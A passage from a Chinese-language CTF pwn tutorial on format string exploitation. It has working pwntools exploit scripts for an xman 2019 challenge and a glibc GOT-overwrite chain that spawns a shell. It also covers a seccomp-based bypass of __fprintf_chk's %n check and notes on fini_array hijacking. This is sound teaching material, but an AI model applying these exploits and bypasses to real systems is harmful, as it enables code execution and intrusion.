class="keyword">and</span> value &lt; (<span class="number">1</span> &lt;&lt; <span class="number">16</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;f5b: &#x27;</span>, <span class="string">&#x27;%&#123;&#125;c%37$hn&#x27;</span>.<span class="built_in">format</span>((stack_addr + offset) &amp; <span class="number">0xFFFF</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;f5b: &#x27;</span>, <span class="string">&#x27;%&#123;&#125;c%85$hn&#x27;</span>.<span class="built_in">format</span>(value))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>):</span><br><span class="line">    <span class="keyword">assert</span> address &lt; (<span class="number">1</span> &lt;&lt; <span class="number">32</span>) <span class="keyword">and</span> value &lt; (<span class="number">1</span> &lt;&lt; <span class="number">16</span>)</span><br><span class="line">    arbitrary_offset_write(<span class="number">0x30</span> * <span class="number">4</span>, address &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    arbitrary_offset_write((<span class="number">0x30</span> * <span class="number">4</span> + <span class="number">2</span>) &amp; <span class="number">0xFFFF</span>, address &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;f5b: &#x27;</span>, <span class="string">&#x27;%&#123;&#125;c%48$hn&#x27;</span>.<span class="built_in">format</span>(value &amp; <span class="number">0xFFFF</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_esp_ret = libc.search(asm(<span class="string">&#x27;add esp, 0x100; sub eax, edx; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">arbitrary_address_write(elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>], add_esp_ret &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">arbitrary_address_write(elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>] + <span class="number">2</span>, add_esp_ret &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">arbitrary_offset_write(<span class="number">0x43</span> * <span class="number">4</span>, system_addr &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">arbitrary_offset_write(<span class="number">0x43</span> * <span class="number">4</span> + <span class="number">2</span>, system_addr &gt;&gt; <span class="number">16</span>)</span><br><span class="line">arbitrary_offset_write(<span class="number">0x45</span> * <span class="number">4</span>, bin_sh_addr &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">arbitrary_offset_write(<span class="number">0x45</span> * <span class="number">4</span> + <span class="number">2</span>, bin_sh_addr &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *&#123;&#125;&#x27;.format(hex(add_esp_ret)))</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">arbitrary_offset_write(<span class="number">0x1c</span>, <span class="number">0x1</span>)  <span class="comment"># change canary to call the __stack_chk_fail</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h3 id="例题2019-xman-format">例题：2019 xman format</h3>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/buuoj/-/tree/master/xman_2019_format" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>同样是格式化字符串。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">sub_8048651</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *buf; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">  buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x37</span>u);</span><br><span class="line">  call_vuln(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
但与上一题不同的是这次的格式化字符串是离线操作，不能泄露地址。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *format; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">  v1 = strtok(buf, <span class="string">&quot;|&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(v1);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    format = strtok(<span class="number">0</span>, <span class="string">&quot;|&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !format )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 另外还有一个后门函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于不能泄露地址，因此只能爆破 ebp 链指向返回地址然后写返回地址为
<code>backdoor</code> 函数地址来 get shell 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/18604cf96259f2a470423e854a4785a0.png"
                     
alt="在这里插入图片描述" 
                > <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./xman_2019_format&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">start = <span class="keyword">lambda</span>: remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25559</span>)  <span class="comment"># process([elf.path])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = start()</span><br><span class="line">        <span class="comment"># gdb.attach(p, &quot;b *0x080485F6\nb *0x8048606&quot;)</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x9c</span>) + <span class="string">&quot;c%10$hhn|%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x85ab</span>) + <span class="string">&quot;c%18$hn&quot;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;...&#x27;</span>, payload)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        p.recvline_contains(<span class="string">&#x27;flag&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        p.close()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure></div></p>
<h2 id="fprintf_chk-绕过">fprintf_chk 绕过</h2>
<p><code>fprintf_chk</code> 执行 <code>%n</code>
会报错,检测逻辑（<code>glibc2.23</code>）。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">LABEL(form_number) : <span class="keyword">if</span> (s-&gt;_flags2 &amp; _IO_FLAGS2_FORTIFY) &#123;                                     \</span><br><span class="line">    <span class="keyword">if</span> (!readonly_format) &#123;                                                                     \</span><br><span class="line">        <span class="keyword">extern</span> <span class="type">int</span> __readonly_area(<span class="type">const</span> <span class="type">void</span> *, <span class="type">size_t</span>)                                        \</span><br><span class="line">                attribute_hidden;                                                               \</span><br><span class="line">        readonly_format = __readonly_area(format, ((STR_LEN(format) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(CHAR_T)));    \</span><br><span class="line">    &#125;                                                                                           \</span><br><span class="line">    <span class="keyword">if</span> (readonly_format &lt; <span class="number">0</span>)                                                                    \</span><br><span class="line">        __libc_fatal(<span class="string">&quot;*** %n in writable segment detected ***\n&quot;</span>);                              \</span><br><span class="line">&#125;      </span><br></pre></td></tr></table></figure></div>
<code>__readonly_area</code> 会通过 <code>fopen</code> 打开
<code>/proc/self/maps</code> 来判断 <code>format</code>
是否是只读段。也就是说只有 <code>format</code> 的内存只读的时候才能有
<code>%n</code> ，从而避免了通过修改 <code>format</code>
实现任意地址写。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __readonly_area(<span class="type">const</span> <span class="type">char</span> *ptr, <span class="type">size_t</span> size) &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">void</span> *ptr_end = ptr + size;</span><br><span class="line"></span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;rce&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* It is the system administrator&#x27;s choice to not have /proc</span></span><br><span class="line"><span class="comment">	 available to this process (e.g., because it runs in a chroot</span></span><br><span class="line"><span class="comment">	 environment.  Don&#x27;t fail in this case.  */</span></span><br><span class="line">        <span class="keyword">if</span> (errno == ENOENT</span><br><span class="line">            <span class="comment">/* The kernel has a bug in that a process is denied access</span></span><br><span class="line"><span class="comment">	     to the /proc filesystem if it is set[ug]id.  There has</span></span><br><span class="line"><span class="comment">	     been no willingness to change this in the kernel so</span></span><br><span class="line"><span class="comment">	     far.  */</span></span><br><span class="line">            || errno == EACCES)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need no locking.  */</span></span><br><span class="line">    __fsetlocking(fp, FSETLOCKING_BYCALLER);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *line = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> linelen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof_unlocked(fp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (_IO_getdelim(&amp;line, &amp;linelen, <span class="string">&#x27;\n&#x27;</span>, fp) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *p;</span><br><span class="line">        <span class="type">uintptr_t</span> from = strtoul(line, &amp;p, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p == line || *p++ != <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *q;</span><br><span class="line">        <span class="type">uintptr_t</span> to = strtoul(p, &amp;q, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (q == p || *q++ != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (from &lt; (<span class="type">uintptr_t</span>) ptr_end &amp;&amp; to &gt; (<span class="type">uintptr_t</span>) ptr) &#123;</span><br><span class="line">            <span class="comment">/* Found an entry that at least partially covers the area.  */</span></span><br><span class="line">            <span class="keyword">if</span> (*q++ != <span class="string">&#x27;r&#x27;</span> || *q++ != <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (from &lt;= (<span class="type">uintptr_t</span>) ptr &amp;&amp; to &gt;= (<span class="type">uintptr_t</span>) ptr_end) &#123;</span><br><span class="line">                size = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (from &lt;= (<span class="type">uintptr_t</span>) ptr)</span><br><span class="line">                size -= to - (<span class="type">uintptr_t</span>) ptr;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (to &gt;= (<span class="type">uintptr_t</span>) ptr_end)</span><br><span class="line">                size -= (<span class="type">uintptr_t</span>) ptr_end - from;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                size -= to - from;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!size)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">free</span>(line);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the whole area between ptr and ptr_end is covered by read-only</span></span><br><span class="line"><span class="comment">     VMAs, return 1.  Otherwise return -1.  */</span></span><br><span class="line">    <span class="keyword">return</span> size == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>结构体 <code>__IO_FILE</code> 利用 <code>_fileno</code>
存储该文件的文件描述符。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE * _IO_file_open (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> posix_mode, <span class="type">int</span> prot, <span class="type">int</span> read_write, <span class="type">int</span> is32not64) &#123;</span><br><span class="line">    <span class="type">int</span> fdesc;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">        fdesc = open_not_cancel (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        fdesc = open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    fdesc = open (filename, posix_mode, prot);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    fp-&gt;_fileno = fdesc;</span><br><span class="line">    _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line">    <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS)) == (_IO_IS_APPENDING | _IO_NO_READS)) &#123;</span><br><span class="line">        _IO_off64_t new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">        <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE) &#123;</span><br><span class="line">	        close_not_cancel (fdesc);</span><br><span class="line">	        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    _IO_link_in ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_open)</span><br></pre></td></tr></table></figure></div>
<p>如果控制 <code>seccomp</code> 让 <code>open</code> 函数返回 0 就会使
<code>__readonly_area</code>
程序从标志输入中读取数据进行判断,此时只需要输入
<code>000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/vm</code>
即可绕过 <code>%n</code> 检测。 ### 例题：2019 中国技能大赛 pwn2 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2019%E4%B8%AD%E5%9B%BD%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B_pwn2" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>edit</code> 函数可以编辑 <code>rule</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.modify the rule.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.modify the chunk.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input yout choice: &quot;</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input the size&quot;</span>);</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v2 - <span class="number">1</span>) &lt;= <span class="number">0xDF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input your content&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, rule, v2);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s no use.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<code>set</code> 功能可以把 <code>rule</code> 设应用到沙箱。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">set</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v1 = <span class="number">11</span>;</span><br><span class="line">  v2 = rule;</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> <code>add</code> 功能有 <code>__fprintf_chk</code>
的格式化字符串漏洞，并且如果 <code>random_num</code> 的值为 0x30
则可以泄露基址。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">leak_libc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebp</span></span><br><span class="line">  _BYTE v3[<span class="number">1288</span>]; <span class="comment">// [rsp+0h] [rbp-528h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+508h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="number">0x500</span>uLL);</span><br><span class="line">  v0 = open(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="number">0x80000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  read(v0, v3, <span class="number">0x500</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, v3, <span class="number">0x500</span>uLL);</span><br><span class="line">  close(v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-114h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">4</span>]; <span class="comment">// [rsp+8h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-10Ch]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+100h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input the size&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  global_size = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid size&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    malloc_node = <span class="built_in">calloc</span>(v1, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input your content: &quot;</span>);</span><br><span class="line">    __read_chk(<span class="number">0LL</span>, (__int64)src, v1, <span class="number">240LL</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(malloc_node, src, v1);</span><br><span class="line">    __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1LL</span>, src);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;The random_num+110 is : %d\n&quot;</span>, random_num);</span><br><span class="line">    <span class="keyword">if</span> ( random_num == <span class="number">0x30</span> )</span><br><span class="line">      leak_libc();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 另外 <code>edit</code> 被 patch
过，在函数开头会向栈中 push 全局变量 <code>random_num</code>
的地址，不难想到 <code>random_num</code> 可以被格式化字符串漏洞修改成
0x30 。 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400DCC push    offset random_num</span><br><span class="line">.text:0000000000400DD1 nop</span><br><span class="line">.text:0000000000400DD2 nop</span><br><span class="line">.text:0000000000400DD3 nop</span><br><span class="line">.text:0000000000400DD4 nop</span><br><span class="line">.text:0000000000400DD5 nop</span><br></pre></td></tr></table></figure></div> 首先编写一个沙箱规则使得系统调用
<code>open</code> 在打开 <code>/proc/self/maps</code> 时会返回 0 。</p>
<p>我们可以通过 <code>open</code> 的第一个参数最低字节是否为
<code>\x7c</code> 来判断打开的是不是 <code>/proc/self/maps</code> 。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/cc5c5c454619137bd901d09d7eade276.png"
                     
alt="在这里插入图片描述" 
                > 另外注意沙箱规则中的 <code>ERRNO</code>
是系统调用返回的错误码，这个与直接终止进程的 <code>KILL</code>
是不同的。 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">A = arch</span><br><span class="line">A == ARCH_X86_64 ? next : dead</span><br><span class="line">A = sys_number</span><br><span class="line">A == close ? dead : next</span><br><span class="line">A == exit_group ? dead : next</span><br><span class="line">A == open ? next : allow</span><br><span class="line">A = args[0]</span><br><span class="line">A &amp;= 0xff</span><br><span class="line">A == 0x7c ? dead : next</span><br><span class="line">allow:</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return ERRNO(0)</span><br></pre></td></tr></table></figure></div> 利用 <code>seccomp-tools</code> 生成规则。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">➜ seccomp-tools asm rule -a amd64 -f raw | seccomp-tools disasm -   </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x06 0x00 0x00000003  if (A == close) goto 0010</span><br><span class="line"> 0004: 0x15 0x05 0x00 0x000000e7  if (A == exit_group) goto 0010</span><br><span class="line"> 0005: 0x15 0x00 0x03 0x00000002  if (A != open) goto 0009</span><br><span class="line"> 0006: 0x20 0x00 0x00 0x00000010  A = filename # open(filename, flags, mode)</span><br><span class="line"> 0007: 0x54 0x00 0x00 0x000000ff  A &amp;= 0xff</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000007c  if (A == 124) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050000  return ERRNO(0)</span><br></pre></td></tr></table></figure></div>
<p>在调用 <code>__fprintf_chk</code> 时 <code>random_num</code> 位于第 6
个参数，而格式化字符串位于第 2 个参数，因此构造格式化字符串
<code>%16p%16p%16p%ln</code> 可以输出 0x30 个字符且 <code>%ln</code>
恰好对应 <code>random_num</code> 。这样就可以将 <code>random_num</code>
修改为 0x30 实现 libc 基址泄露。另外注意由于沙箱规则使得
<code>open</code> 打开 <code>/proc/self/maps</code> 时会返回 0
，因此需要在调用 <code>__fprintf_chk</code> 时输入
<code>000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/vm</code>
绕过<code>__fprintf_chk</code> 的检查。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/34cb11d12a75214c8ad128d7482e4c15.png"
                     
alt="在这里插入图片描述" 
                > 后续按照同样的方法修改 <code>free@got</code>
为 <code>system</code> 函数地址完成 getshell 。</p>
<h2 id="fini_array-不可写绕过">fini_array 不可写绕过</h2>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">  <span class="built_in">ElfW</span>(Addr) *array = (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="type">fini_t</span>) array[i]) ();</span><br><span class="line">    <span class="comment">//可以劫持</span></span><br><span class="line">    <span class="comment">//先调用array[i],再调用array[i-1]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用的汇编代码如下(<code>ubuntu18.04</code>).</p>
